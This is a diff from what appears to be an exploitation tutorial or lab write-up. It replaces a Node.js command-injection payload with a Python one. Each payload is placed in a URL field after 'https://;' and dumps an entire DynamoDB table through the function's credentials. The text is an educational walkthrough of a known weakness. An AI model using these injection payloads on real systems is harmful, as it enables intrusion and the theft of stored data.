@@ -139,7 +139,7 @@ These permissions will now allow us to exploit the OS command injection weakness
 
 Let's use the following payload in the URL field, and see what happens:
 ```
-https://; node -e 'const AWS = require("aws-sdk"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'
+https://; python -c 'import os;import boto3;print(boto3.resource("dynamodb").Table(os.getenv("TABLE_NAME")).scan())' #
 ```
 **Bingo!** we got the entire contents of the table:
 ```
